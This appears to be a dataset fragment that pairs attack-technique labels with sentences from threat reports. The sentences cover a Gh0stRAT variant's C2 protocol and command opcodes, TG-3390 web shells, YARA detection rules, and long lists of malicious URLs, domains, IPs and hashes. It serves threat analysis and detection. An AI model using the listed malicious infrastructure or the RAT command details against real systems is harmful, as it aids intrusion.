http://stevemike-fireforce[.]info/work/doc/5.doc   http://bit[.]ly/2JloadingspWgLs2 http://acorn-paper[.]com/components/com_content/models/oc/s.doc   http://bit[.]ly/Loadingpleasewaitnn http://stevemike-fireforce[.]info/work/dola/4.doc   http://bit[.]ly/2sPe3wZrdtrdytd http://stemtopx[.]com/work/doc/2.doc   http://bit[.]ly/LAdooing http://onedrivenet[.]xyz/work/docnew/6.doc   http://bit[.]ly/LoadIng http://guelphupholstery[.]com/images/yupsia/doc/62.doc   http://bit[.]ly/2JnMVQz http://stemtopx[.]com/work/doc/14.doc   http://bit[.]ly/DocumentIsLoadingPleasewait http://stemtopx[.]com/work/i/2.doc   http://bit[.]ly/2HVD1Bh http://fast-cargo[.]com/images/file/vb/VBS/doc/4.doc   http://bit[.]ly/2uoqexc http://zupaservices[.]info/doc/1.doc   http://bit[.]ly/2vXgnqdASdj2929iqwSdu9iw9i http://stevemike-fireforce[.]info/work/doc/13.doc   http://bit[.]ly/4_loadingEwHlnA http://diamondfoxpanel[.]ml/doc/4.doc   http://bit[.]ly/lLoadingl9 http://fast-cargo[.]com/images/file/vb/VBS/doc/9.doc   http://bit[.]ly/LlLoadinG https://www.0-day[.]us/img/doc/2.doc   http://bit[.]ly/2kTPwmFdrwfdtsfdfyr http://stemtopx[.]com/work/doc/1.doc   http://bit[.]ly/2G34tww http://fast-cargo[.]com/old/images/file/vb/VBS/smon/doc/testa.doc   http://bit[.]ly/2HvQBir http://stevemike-fireforce[.]info/work/dola/3.doc   http://bit[.]ly/golden_uae http://fast-cargo[.]com/old/images/file/vb/VBS/smon/doc/xchange.doc   http://bit[.]ly/pele2HROHp1 http://acorn-paper[.]com/images/locations/thumbnails/z/oc/z.doc   http://bit[.]ly/2rlqLDBMSloading http://panelonetwothree[.]ml/iran/uae/done/oc2/uae.doc   http://bit[.]ly/2JDUVMC http://stemtopx[.]com/work/doc/11.doc   http://bit[.]ly/2K1GYVgtyfctftfTFTYFUFtufutfu http://stevemikeforce[.]com/work/doc/11.doc   http://bit[.]ly/2Jr4dby http://stemtopx[.]com/work/doc/18.doc   http://bit[.]ly/2M9I8z4 http://stemtopx[.]com/work/newdoc/2.doc   http://bit[.]ly/ASD8239ASdmkWi38AS http://stevemike-fireforce[.]info/work/dola/4.doc   http://bit[.]ly/LoadingPelasewaits http://stevemike-fireforce[.]info/work/docnew/2.doc   http://bit[.]ly/2JnNtG7 http://stemtopx[.]com/work/doc/17.doc   http://bit[.]ly/shawclk2HZJXOr http://panelonetwothree[.]ml/simon/exp/25exp/26/doc/final/26.doc   http://bit[.]ly/loadijgng http://onedrivenet[.]xyz/work/docnew/9.doc   http://bit[.]ly/PleaseWaitLoading http://www.asaigoldenrice[.]com/daq/doc/7.doc   http://bit[.]ly/Loadinger http://onedrivenet[.]xyz/work/docnew/1.doc   http://bit[.]ly/Workingwait http://onedrivenet[.]xyz/work/docnew/21.doc   http://bit[.]ly/Loadingplzwait http://www.asaigoldenrice[.]com/daq/doc/5.doc   http://bit[.]ly/2HuOFBQ http://stemtopx[.]com/work/doc/5.doc   http://bit[.]ly/LoadingPleasewait1 http://onedrivenet[.]xyz/work/docnew/20.doc   http://bit[.]ly/LlOrRinding http://www.0-day[.]us/img/doc/11.doc   http://bit[.]ly/Loadingwaitplzz http://onedrivenet[.]xyz/work/docnew/16.doc   http://bit[.]ly/2HWdrzTgfufuyfkCTYTDFYTgtfutf http://stevemikeforce[.]com/work/doc/12.doc   http://bit[.]ly/2KHEnRKxestrhdyhdDTDRDTRthdydy http://stevemikeforce[.]com/work/doc/10.doc   http://bit[.]ly/unkwonas http://asaigoldenrice[.]com/sim/new.vbs   http://bit[.]ly/Laodiingpleasewait http://onedrivenet[.]xyz/work/docnew/13.doc   http://bit[.]ly/wordxchange http://asaigoldenrice[.]com/sim/doc/kalu.doc   http://bit[.]ly/Loadsinfpleasewait http://onedrivenet[.]xyz/work/docnew/30.docx   http://bit[.]ly/Loardsing http://www.0-day[.]us/img/doc/7.doc   http://bit[.]ly/2ImbyrQ http://acorn-paper[.]com/administrator/6.doc   http://bit[.]ly/LoadingPleasewait http://onedrivenet[.]xyz/work/docnew/20.doc    \u00a0 Domains For a list of domains encountered in use by malware throughout this campaign, please refer to the following file"
        ]
    },
    "dll search order hijacking dll side-loading exploitation for client execution-multi": {
        "technique_names": [
            "dll search order hijacking",
            "dll side-loading",
            "exploitation for client execution"
        ],
        "sentances": [
            "Exploits  CVE-2017-0143, SMB exploit CVE-2017-0146, SMB exploit  These 2 exploits are EternalBlue/Doublepulsar and are used to drop the Stage1 Dropper onto a system.\u00a0 Installation The Gh0stRAT dropper arrives on a PC through the use of EternalBlue/DoublePulsar.\u00a0 Once on a victim\u2019s PC, the dropper executable is launched and it decrypts and loads the Gh0stRAT DLL into memory.\u00a0 It then passes the config buffer to the extracted DLL and calls the exported function (Shellex)  [Screenshot 2] The mainthread of the code.\u00a0 Note the call at the bottom that calls Shellex Gh0stRAT dll functionality An important note:\u00a0 In its base state, this sample is damaged, therefore it will not install its services properly.\u00a0 However, as the service information is included, I will list it anyways.\u00a0 Additionally, samples downloaded from its distribution server DO install correctly,\u00a0 and are downloaded during the base dll\u2019s runtime"
        ]
    },
    "standard cryptographic protocol data encoding-multi": {
        "technique_names": [
            "standard cryptographic protocol",
            "data encoding"
        ],
        "sentances": [
            "Techniques for Analysis When I was analyzing this sample, the malware was unable to connect to its C2.\u00a0 However, I was still able to analyze the network traffic of the sample.\u00a0 How, you might ask?\u00a0 Using a hex editor and a script I wrote to encrypt text using the algorithm that this sample uses, I encrypted my own C2 address (192.168.1.108:7721) and replaced the hardcoded C2 address with my own encrypted address.\u00a0 I then opened a listener on my own IP on the respective port.\u00a0 \u00a0 [Screenshot 3] comparison of My IP (Left) vs C2 IP (Right) Next, using a debugger, I set a couple breakpoints in the Internet Communications function and ran the malware.\u00a0 The malware sample then connected to my IP and sent information to me, which I was able to observe using Wireshark.\u00a0 After I\u2019d captured the traffic, I was able to write another script to decrypt and decompress the traffic in order to view the data being sent.\u00a0 Additionally, I then wrote a socket script that detects the Gh0stRAT variant traffic, automatically decrypts the traffic, and then extracts the Implant_Opcodes for the sample.\u00a0 A second version of the script allows commands to be sent back to the malware, after I enumerated the exact command format for the sample.\u00a0  [Screenshot 4] Output of Version 1 of the script So far, the 2 opcodes that the sample has sent are 0x65 and 0x66, or Implant_Heartbeat and Implant_Login, respectively.\u00a0 \u201cHitting between the heartbeats\u201d When sending commands, first the sample must login in with 0x65, then you can send commands to it.\u00a0 However, you have to move fast as the sample will send an Implant_Heartbeat followed by an Implant_Login every 10 seconds or so, and if you try to send a command to the sample as it is responding with either opcode, it will ignore the command.\u00a0 A proof of concept of the command script can be found\u00a0here\u00a0, while the Implant extraction script and the Command Script will be included in the Appendix"
        ]
    },
    "process injection dll search order hijacking rundll32 dll side-loading input capture-multi": {
        "technique_names": [
            "process injection",
            "dll search order hijacking",
            "rundll32",
            "dll side-loading",
            "input capture"
        ],
        "sentances": [
            "Command_Keylog_offline:\u00a0 Load into memory a dll that contains the function \u201cPluginMe\u201d.\u00a0 After researching and analyzing additional Gh0stRAT samples while trying to figure out what dll contains \u201cPluginMe\u201d, I found a DLL for keylogging (called Keylog.dll) in a Gh0stRAT 2.0 sample that exported \u201cPluginMe\u201d.\u00a0 Using that and a cross-comparison of another Gh0stRAT sample that I\u2019ve previously analyzed, I was able to determine that \u201cPluginMe\u201d is a offline keyboard manager"
        ]
    },
    "file deletion command-line interface indicator removal on host web service-multi": {
        "technique_names": [
            "file deletion",
            "command-line interface",
            "indicator removal on host",
            "web service",
            "tor"
        ],
        "sentances": [
            "Command_Update_Server:\u00a0 This command passes the string \u201cGh0st Update\u201d to the malware sample before running the sample again.\u00a0 When the sample restarts, it detects the \u201cGh0st Update\u201d command line arg, and connects to the server in order to update the sample.\u00a0 Command_Clean_Event:\u00a0 This command locates and deletes all of the event logs on the system"
        ]
    },
    "system service discovery standard application layer protocol service execution-multi": {
        "technique_names": [
            "system service discovery",
            "standard application layer protocol",
            "service execution"
        ],
        "sentances": [
            "IOC\u2019s and YARA rules     Sample   MD5   Size   IP   IOC     TdxWCfg.exe   474b3cd073b0a40d656b1a2f5bb673cf   708KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq \u00a0 %Program Files (x86)%/DIFXE/svchost.exe     Tdx_Dropped   9bce099b5b01c305a5d98f1fd262bce1   143.05KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq \u00a0     dwm.exe   00aaf0ddcc8d9b197c148e44d9e72d8d   384KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq %Program Files (x86)%/DIFXE/svchost.exe     dwm_dropped   a548c18aa678626dab9b60628712cc18   84KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq \u00a0     \u00a0 Yara Rules:     rule gh0strat_variant_dropper   \u00a0     \u00a0   {     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 meta:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 author = \"James Quinn, @lazyactivist192\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 desc = \"Identifies a Gh0stRAT dropper\"     \u00a0    \u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 strings:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s1 = \"+gPp6bGvrqa9/fz2770A/amupqawrp8=\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s2 = \"Shellex\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s3 = \"SUSRAIZCqllahrCohrlojSarZSalpecasZ\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s4 = \"[printto(\\\"%1\\\",\\\"%2\\\",\\\"%3\\\",\\\"%4\\\")]\"     \u00a0    \u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s6 = \"SYST%-\\\\#urrENt#ONtrOLSEt\\\\SErvICEs\\\\\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 condition:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 2 of ($s1, $s2, $s4) and 1 of ($s3, $s6)     \u00a0   }     \u00a0   rule gh0strat_variant     \u00a0   {     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 meta:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 author = \"James Quinn, @lazyactivist192\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 desc = \"Identifies a Gh0stRAT variant\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 strings:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s1 = \"\\\\\\\\.\\\\agmkis2\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s2 = \"Shellex\"     \u00a0   \u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s3 = \"Gh0st Update\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s4 = \"PluginMe\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 condition:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 all of them     \u00a0   }     Appendix  Socket script Version 1: https://github.com/Jquinn147/Analysis-Automation/blob/master/Python/Gh0stRAT_Variant_Socket.py Socket Script V2(Command Script): https://github.com/Jquinn147/Analysis-Automation/blob/master/Python/Gh0stRatSocket.py Citations: Martin, D"
        ]
    },
    "command-line interface web shell-multi": {
        "technique_names": [
            "command-line interface",
            "web shell"
        ],
        "sentances": [
            "(Source: Dell SecureWorks)  ChinaChopper web shell \u2014 A web-based executable script (see Figure 4) that allows a threat actor to execute commands on the compromised system",
            "The server-side component provides a simple graphical user interface for threat actors interacting with web shells",
            "(Source: Dell SecureWorks)   The following tools appear to be exclusive to TG-3390:  OwaAuth web shell \u2014 A web shell and credential stealer deployed to Microsoft Exchange servers",
            "Like the ChinaChopper web shell, the OwaAuth web shell requires a password",
            "TG-3390 actors keep track of and leverage existing ASPXTool web shells in their operations, preferring to issue commands via an internally accessible web shell rather than HttpBrowser or PlugX",
            "(Source: Dell SecureWorks) Appendix C \u2014 OwaAuth web shell analysis OwaAuth is a web shell that is installed as an ISAPI filter on Exchange servers and shares characteristics with the ChinaChopper web shell",
            "(Source: Dell SecureWorks) Table 4 lists the OwaAuth web shell commands available to the adversary"
        ]
    },
    "connection proxy command-line interface web shell-multi": {
        "technique_names": [
            "connection proxy",
            "command-line interface",
            "web shell"
        ],
        "sentances": [
            "In other cases, threat actors placed web shells on externally accessible servers, sometimes behind a reverse proxy, to execute commands on the compromised system"
        ]
    },
    "code signing standard cryptographic protocol-multi": {
        "technique_names": [
            "code signing",
            "standard cryptographic protocol"
        ],
        "sentances": [
            "Newer HttpBrowser versions use SSL with self-signed certificates to encrypt network communications"
        ]
    },
    "custom cryptographic protocol system network configuration discovery-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "system network configuration discovery"
        ],
        "sentances": [
            "TG-3390 actors frequently change the C2 domain's A record to point to the loopback IP address 127.0.0.1, which is a variation of a technique known as \"parking.\" Other variations of parking point the IP address to Google's recursive name server 8.8.8.8, an address belonging to Confluence, or to other non-routable addresses"
        ]
    },
    "system information discovery file and directory discovery-multi": {
        "technique_names": [
            "system information discovery",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "As shown in Figure 11, after compromising an initial victim's system (patient 0), the threat actors use the Baidu search engine to search for the victim's organization name"
        ]
    },
    "scheduled task command-line interface-multi": {
        "technique_names": [
            "scheduled task",
            "command-line interface"
        ],
        "sentances": [
            "TG-3390 actors favor At.exe to create scheduled tasks for executing commands on remote systems"
        ]
    },
    "system owner/user discovery web shell-multi": {
        "technique_names": [
            "system owner/user discovery",
            "web shell"
        ],
        "sentances": [
            "Team member or team identifier Analysis of the OwaAuth web shell revealed a PDB string with the \"SyberSpace\" username (see Figure 20)"
        ]
    },
    "permission groups discovery spearphishing link custom cryptographic protocol masquerading standard cryptographic protocol binary padding system network configuration discovery registry run keys / startup folder exfiltration over alternative protocol pass the hash commonly used port-multi": {
        "technique_names": [
            "permission groups discovery",
            "spearphishing link",
            "custom cryptographic protocol",
            "masquerading",
            "standard cryptographic protocol",
            "binary padding",
            "system network configuration discovery",
            "registry run keys / startup folder",
            "exfiltration over alternative protocol",
            "pass the hash",
            "commonly used port",
            "arp"
        ],
        "sentances": [
            "Indicator Type Context   american.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   api.apigmail.com Domain name TG-3390 infrastructure Confidence: High   apigmail.com Domain name TG-3390 infrastructure  Confidence: High   backup.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   bel.updatawindows.com Domain name TG-3390 infrastructure  Confidence: High   binary.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   castle.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   ctcb.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   darkhero.org Domain name TG-3390 infrastructure Confidence: High   dav.local-test.com Domain name TG-3390 infrastructure  Confidence: High   test.local-test.com Domain name TG-3390 infrastructure Confidence: High   dev.local-test.com Domain name TG-3390 infrastructure  Confidence: High   ocean.local-test.com Domain name TG-3390 infrastructure  Confidence: High   ga.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.csc-na.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.hotmail-onlines.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.lnip.org Domain name TG-3390 infrastructure  Confidence: High   hotmail-onlines.com Domain name TG-3390 infrastructure Confidence: High   jobs.hotmail-onlines.com Domain name TG-3390 infrastructure  Confidence: High   justufogame.com Domain name TG-3390 infrastructure  Confidence: High   lnip.org Domain name TG-3390 infrastructure Confidence: High   local-test.com Domain name TG-3390 infrastructure  Confidence: High   login.hansoftupdate.com Domain name TG-3390 infrastructure  Confidence: High   long.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   longlong.update-onlines.org Domain name TG-3390 infrastructure Confidence: High   longshadow.dyndns.org Domain name TG-3390 infrastructure  Confidence: High   longshadow.update-onlines.org Domain name TG-3390 infrastructure Confidence: High   longykcai.update-onlines.org Domain name TG-3390 infrastructure Confidence: High   lostself.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   mac.navydocument.com Domain name TG-3390 infrastructure  Confidence: High   mail.csc-na.com Domain name TG-3390 infrastructure Confidence: High   mantech.updatawindows.com Domain name TG-3390 infrastructure  Confidence: High    micr0soft.org Domain name TG-3390 infrastructure  Confidence: High    microsoft-outlook.org Domain name TG-3390 infrastructure  Confidence: High    mtc.navydocument.com Domain name TG-3390 infrastructure  Confidence: High    navydocument.com Domain name TG-3390 infrastructure  Confidence: High    mtc.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High    news.hotmail-onlines.com Domain name TG-3390 infrastructure  Confidence: High   oac.3322.org Domain name TG-3390 infrastructure  Confidence: High   ocean.apigmail.com Domain name TG-3390 infrastructure  Confidence: High   pchomeserver.com Domain name TG-3390 infrastructure  Confidence: High   registre.organiccrap.com Domain name TG-3390 infrastructure  Confidence: High   security.pomsys.org Domain name TG-3390 infrastructure  Confidence: High   services.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   sgl.updatawindows.com Domain name TG-3390 infrastructure  Confidence: High   shadow.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   sonoco.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   test.logmastre.com Domain name TG-3390 infrastructure Confidence: High   up.gtalklite.com Domain name TG-3390 infrastructure  Confidence: High   updatawindows.com Domain name TG-3390 infrastructure  Confidence: High   update-onlines.org Domain name TG-3390 infrastructure Confidence: High   update.deepsoftupdate.com Domain name TG-3390 infrastructure  Confidence: High   update.hancominc.com Domain name TG-3390 infrastructure  Confidence: High   update.micr0soft.org Domain name TG-3390 infrastructure Confidence: High   update.pchomeserver.com Domain name TG-3390 infrastructure  Confidence: High   urs.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   wang.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   webs.local-test.com Domain name TG-3390 infrastructure Confidence: High   word.apigmail.com Domain name TG-3390 infrastructure  Confidence: High   wordpress.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   working.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   working.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   working.hotmail-onlines.com Domain name TG-3390 infrastructure Confidence: High   www.trendmicro-update.org Domain name TG-3390 infrastructure  Confidence: High   www.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   x.apigmail.com Domain name TG-3390 infrastructure  Confidence: High   ykcai.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   ykcailostself.dyndns-free.com Domain name TG-3390 infrastructure  Confidence: High   ykcainobody.dyndns.org Domain name TG-3390 infrastructure  Confidence: High   zj.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   laxness-lab.com Domain name TG-3390 infrastructure  Confidence: High   google-ana1ytics.com Domain name TG-3390 infrastructure  Confidence: High   www.google-ana1ytics.com Domain name TG-3390 infrastructure  Confidence: High   ftp.google-ana1ytics.com Domain name TG-3390 infrastructure  Confidence: High   hotmailcontact.net Domain name TG-3390 infrastructure  Confidence: High   208.115.242.36 IP address TG-3390 infrastructure  Confidence: High   208.115.242.37 IP address TG-3390 infrastructure Confidence: High   208.115.242.38 IP address TG-3390 infrastructure  Confidence: High   66.63.178.142 IP address TG-3390 infrastructure  Confidence: High   72.11.148.220 IP address TG-3390 infrastructure  Confidence: High   72.11.141.133 IP address TG-3390 infrastructure  Confidence: High   74.63.195.236 IP address TG-3390 infrastructure  Confidence: High   74.63.195.236 IP address TG-3390 infrastructure  Confidence: High   74.63.195.237 IP address TG-3390 infrastructure Confidence: High   74.63.195.238 IP address TG-3390 infrastructure Confidence: High   103.24.0.142 IP address TG-3390 infrastructure Confidence: High   103.24.1.54 IP address TG-3390 infrastructure  Confidence: High   106.187.45.162 IP address TG-3390 infrastructure Confidence: High   192.151.236.138 IP address TG-3390 infrastructure Confidence: High   192.161.61.19 IP address TG-3390 infrastructure Confidence: High   192.161.61.20 IP address TG-3390 infrastructure Confidence: High   192.161.61.22 IP address TG-3390 infrastructure Confidence: High   103.24.1.54 IP address TG-3390 infrastructure Confidence: High   67.215.232.179 IP address TG-3390 infrastructure Confidence: High   96.44.177.195 IP address TG-3390 infrastructure Confidence: High   49.143.192.221 IP address TG-3390 infrastructure Confidence: Moderate   67.215.232.181 IP address TG-3390 infrastructure Confidence: Moderate   67.215.232.182 IP address TG-3390 infrastructure Confidence: Moderate   96.44.182.243 IP address TG-3390 infrastructure Confidence: Moderate   96.44.182.245 IP address TG-3390 infrastructure Confidence: Moderate   96.44.182.246 IP address TG-3390 infrastructure Confidence: Moderate   49.143.205.30 IP address TG-3390 infrastructure Confidence: Moderate   working_success@163.com Email address TG-3390 email address Confidence: High   ykcaihyl@163.com Email address TG-3390 email address Confidence: High   working_success@163.com Email address TG-3390 email address Confidence: High   yuming@yinsibaohu.aliyun.com Email address TG-3390 email address Confidence: Low   1cb4b74e9d030afbb18accf6ee2bfca1 MD5 hash HttpBrowser RAT dropper   b333b5d541a0488f4e710ae97c46d9c2 MD5 hash HttpBrowser RAT dropper   86a05dcffe87caf7099dda44d9ec6b48 MD5 hash HttpBrowser RAT dropper   93e40da0bd78bebe5e1b98c6324e9b5b MD5 hash HttpBrowser RAT dropper   f43d9c3e17e8480a36a62ef869212419 MD5 hash HttpBrowser RAT dropper   57e85fc30502a925ffed16082718ec6c MD5 hash HttpBrowser RAT dropper   4251aaf38a485b08d5562c6066370f09 MD5 hash HttpBrowser RAT dropper   bbfd1e703f55ce779b536b5646a0cdc1 MD5 hash HttpBrowser RAT dropper   12a522cb96700c82dc964197adb57ddf MD5 hash HttpBrowser RAT dropper   728e5700a401498d91fb83159beec834 MD5 hash HttpBrowser RAT dropper   2bec1860499aae1dbcc92f48b276f998 MD5 hash HttpBrowser RAT dropper   014122d7851fa8bf4070a8fc2acd5dc5 MD5 hash HttpBrowser RAT   0ae996b31a2c3ed3f0bc14c7a96bea38 MD5 hash HttpBrowser RAT   1a76681986f99b216d5c0f17ccff2a12 MD5 hash HttpBrowser RAT   380c02b1fd93eb22028862117a2f19e3 MD5 hash HttpBrowser RAT   40a9a22da928cbb70df48d5a3106d887 MD5 hash HttpBrowser RAT   46cf2f9b4a4c35b62a32f28ac847c575 MD5 hash HttpBrowser RAT   5436c3469cb1d87ea404e8989b28758d MD5 hash HttpBrowser RAT   692cecc94ac440ec673dc69f37bc0409 MD5 hash HttpBrowser RAT   6a39a4e9933407aef31fdc3dfa2a2a95 MD5 hash HttpBrowser RAT   8b4ed3b392ee5da139c16b8bca38ea5e MD5 hash HttpBrowser RAT   8ea5d8bb6b28191e4436456c35477e39 MD5 hash HttpBrowser RAT   9271bcfbba056c8f80c7f04d72efd62d MD5 hash HttpBrowser RAT   996843b55a7c5c7a36e8c6956e599610 MD5 hash HttpBrowser RAT   a554efc889714c70e9362bdc81fadd6a MD5 hash HttpBrowser RAT   c9c93c2d62a084031872aab96202ee3e MD5 hash HttpBrowser RAT   ddbdf0efdf26e0c267ef6155edb0e6b8 MD5 hash HttpBrowser RAT   e7df18a17d8e7c2ed541a57020444068 MD5 hash HttpBrowser RAT   ea4dcafc224f604c096032dde33a1d6d MD5 hash HttpBrowser RAT   f658bb17d69912404f34532901edad0e MD5 hash HttpBrowser RAT   f869a1b40f6438dfdd89e73480103211 MD5 hash HttpBrowser RAT   81ed752590752016cb1c12f3e9ab3454 MD5 hash HttpBrowser RAT   5ef719f8aeb9bf97beb24a5c2ed19173 MD5 hash HttpBrowser RAT   7ec91768376324be2bad4fd30b1c2051 MD5 hash HttpBrowser RAT   20c446ad2d7d1586138b493ecddfbbc7 MD5 hash HttpBrowser RAT   44cf0793e05ba843dd53bbc7020e0f1c MD5 hash HttpBrowser RAT   02826bb6636337963cc5162e6f87745e MD5 hash HttpBrowser RAT   1606ab7a54735af654ee6deb7427f652 MD5 hash HttpBrowser RAT   1539b3a5921203f0e2b6c05d692ffa27 MD5 hash HttpBrowser RAT   c66e09429ad6669321e5c69b1d78c082 MD5 hash HttpBrowser RAT   225e10e362eeee15ec64246ac021f4d6 MD5 hash HttpBrowser RAT   a631fc7c45cbdf80992b9d730df0ff51 MD5 hash HttpBrowser RAT   af785b4df71da0786bcae233e55cf6c1 MD5 hash HttpBrowser RAT   e3e0f3ad4ff3b981b513cc66b37583e8 MD5 hash HttpBrowser RAT   5cd0e97a1f09001af5213462aa3f7eb1 MD5 hash HttpBrowser RAT   15fd9c04d6099273a9acf8feab81acfe MD5 hash HttpBrowser RAT   ea8b9e0bf95fc0c71694310cb685cd3b MD5 hash HttpBrowser RAT   5c3ab475be110ec59257617ee1388e01 MD5 hash HttpBrowser RAT   6aac7417ea1eb60a869597af9049b8fa MD5 hash HttpBrowser RAT   372f5370085a63f5b660fab635ce6cd7 MD5 hash HttpBrowser RAT   fac4885324cb67bd421d6250fdc9533c MD5 hash HttpBrowser RAT   e7e555615a07040bb5dbe9ce59ac5d11 MD5 hash HttpBrowser RAT   ff34cb1d90d76a656546293e879afe22 MD5 hash HttpBrowser RAT   2abf7421c34c60d48e09325a206e720e MD5 Hash HttpBrowser RAT   396b4317db07cc8a2480786160b33044 MD5 hash HttpBrowser RAT   e404873d3fcd0268db10657b53bdab64 MD5 hash HttpBrowser RAT   6e4189b20adb253b3c1ad7f8fdc95009 MD5 hash HttpBrowser RAT   bff424289c38d389a8cafb16b47dfe39 MD5 hash HttpBrowser RAT   7294c7f3860315d51f74152e8ad353df MD5 hash HttpBrowser RAT   40092f76fea082b05e9631d91975a401 MD5 hash HttpBrowser RAT   e42fce74bbd637c35320cf4e95f5e055 MD5 hash HttpBrowser RAT   d0dafc3716a0d0ce393cde30b2b14a07 MD5 hash HttpBrowser RAT   ae66bad0c7de88ab0ab1050c4bec9095 MD5 hash HttpBrowser RAT   c7c2be1cd3780b2ba4638cef9a5422c7 MD5 hash HttpBrowser RAT   405949955b1cb65673c16bf7c8da2f4d MD5 hash HttpBrowser RAT   ff4f052dbe73a81403df5e98313000fb MD5 hash HttpBrowser RAT   b30fcd362c7b8ac75b7dddfe6cb448c7 MD5 hash HttpBrowser RAT   1d24f4d20b80562de46a8ac95d0ff8c2 MD5 hash HttpBrowser RAT   9538bbdb3a73201b40296e9d4dc80ade MD5 hash HttpBrowser RAT   46bb2caeda30c09a6337fd46ec98c32c MD5 hash HttpBrowser RAT   0c8842e48e80643d91dd290d0f786147 MD5 hash HttpBrowser RAT   0fc975c3c4e6c546b4f2b5aaed50dd78 MD5 hash HttpBrowser RAT   41be449f687828466ed7d87f0f30a278 MD5 hash HttpBrowser RAT   2b95caf3307ebd36cf405b1133b30aa8 MD5 hash HttpBrowser RAT   ccc715a4d9d0157b9776deacdb26bf78 MD5 hash HttpBrowser RAT   37933acfa8d8e78c54413d88ca705e17 MD5 hash HttpBrowser RAT   2813c5a1c87f7e3d33174fed8b0988a1 MD5 hash HttpBrowser RAT   8f22834efe52ccefb17e768569eb36b9 MD5 hash HttpBrowser RAT   6f01628a0b5de757a8dbe99020499d10 MD5 hash HttpBrowser RAT   7f8d9f12f41156512b60ab17f8d85fe9 MD5 hash HttpBrowser RAT   debe5ef2868b212f4251c58be1687660 MD5 hash HttpBrowser RAT   e136d4ebab357fd19df8afe221460571 MD5 hash HttpBrowser RAT   a86a906cfafaf1d7e3725bb0161b0cfe MD5 hash HttpBrowser RAT   03e1eac3512a726da30fff41dbc26039 MD5 hash HttpBrowser RAT   baac5e5dd3ce7dae56cab6d3dac14e15 MD5 hash HttpBrowser RAT   0f7dde31fbeb5ddbb6230c401ed41561 MD5 hash HttpBrowser RAT   36d957f6058f954541450f5a85b28d4b MD5 hash HttpBrowser RAT   42d874f91145bd2ddf818735346022d8 MD5 hash HttpBrowser RAT   3468034fc3ac65c60a1f1231e3c45107 MD5 hash HttpBrowser RAT   4e3b51a6a18bdb770fc38650a70b1883 MD5 hash HttpBrowser RAT   3647068230839f9cadf0fd4bd82ade84 MD5 hash HttpBrowser RAT   550922107d18aa4caad0267997709ee5 MD5 hash HttpBrowser RAT   d8f0a6450f9df637daade521dc90d29d MD5 hash HttpBrowser RAT   bf2e2283b19b0febc4bd1f47aa82a94c MD5 hash HttpBrowser RAT   d0eec2294a70ceff84ca8d0ed7939fb5 MD5 hash HttpBrowser RAT   e91d2464c8767552036dd0294fc7e6fb MD5 hash 